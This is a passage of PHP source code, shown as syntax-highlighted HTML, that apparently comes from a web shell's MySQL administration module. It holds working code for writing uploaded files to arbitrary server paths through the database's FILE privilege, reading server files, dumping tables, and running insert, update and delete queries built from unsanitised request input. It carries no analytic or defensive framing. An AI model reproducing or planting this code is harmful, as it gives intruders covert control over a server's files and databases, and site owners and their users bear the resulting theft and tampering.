<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST" enctype="multipart/form-data" name</span><span style="color: #8abeb7; text-decoration: underline;">="mysqlfile" id="mysqlfile"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" ty</span><span style="color: #8abeb7; text-decoration: underline;">pe="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /</span><span style="color: #8abeb7; text-decoration: underline;">&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dbhost'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dbport'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dbuser'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dbpass'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dbname'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'charset'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'doing'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'sqlfile'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
}

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'mysqladmin'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span> = <span style="color: #8abeb7;">'localhost'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span> = <span style="color: #8abeb7;">'root'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span> = <span style="color: #8abeb7;">'3306'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> = <span style="color: #8abeb7;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbhost\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbuser\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbpass\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbport\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\</span><span style="color: #8abeb7; text-decoration: underline;">"$dbname\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span> .= <span style="color: #8abeb7;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value</span><span style="color: #8abeb7; text-decoration: underline;">=\"$charset\" /&gt;\n"</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'backupmysql'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">saveasfile</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Please choose the table'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span> = <span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">table</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">k</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   sqldumptable(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   fclose(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);<span style="color: #de935f; background-color: #373b41;">                </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileurl</span> = str_replace(<span style="color: #81a2be;">SA_ROOT</span>,<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Database has success backup to &lt;a href="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileurl</span>.<span style="color: #8abeb7;">'" target=</span><span style="color: #8abeb7; text-decoration: underline;">"_blank"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">path</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   mysql_close();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Backup failed'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">insert</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">insertsql</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">keystr</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">valstr</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">insertsql</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">val</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">val</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">keystr</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">valstr</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span>.<span style="color: #8abeb7;">"'"</span>.addslashes(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">val</span>).<span style="color: #8abeb7;">"'"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">','</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">keystr</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">valstr</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(q(<span style="color: #8abeb7;">"INSERT INTO </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;"> (</span><span style="color: #f0c674;">$keystr</span><span style="color: #8abeb7;">) VALUES (</span><span style="color: #f0c674;">$valstr</span><span style="color: #8abeb7;">)"</span>) ? <span style="color: #8abeb7;">'Insert n</span><span style="color: #8abeb7; text-decoration: underline;">ew record of success'</span><span style="text-decoration: underline;"> : mysql_error());</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">update</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">insertsql</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">base64</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">valstr</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">insertsql</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">val</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">valstr</span> .= <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span>.<span style="color: #8abeb7;">"='"</span>.addslashes(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">val</span>).<span style="color: #8abeb7;">"'"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tmp</span> = <span style="color: #8abeb7;">','</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">valstr</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> = base64_decode(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">base64</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(q(<span style="color: #8abeb7;">"UPDATE </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;"> SET </span><span style="color: #f0c674;">$valstr</span><span style="color: #8abeb7;"> WHERE </span><span style="color: #f0c674;">$where</span><span style="color: #8abeb7;"> LIMIT 1"</span>) ? <span style="color: #8abeb7;">'Record </span><span style="color: #8abeb7; text-decoration: underline;">updating'</span><span style="text-decoration: underline;"> : mysql_error());</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'del'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">base64</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">where</span> = base64_decode(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">base64</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">delete_sql</span> = <span style="color: #8abeb7;">"DELETE FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;"> WHERE </span><span style="color: #f0c674;">$where</span><span style="color: #8abeb7;">"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(q(<span style="color: #8abeb7;">"DELETE FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;"> WHERE </span><span style="color: #f0c674;">$where</span><span style="color: #8abeb7;">"</span>) ? <span style="color: #8abeb7;">'Deletion record of success</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;"> : mysql_error());</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'drop'</span>) {
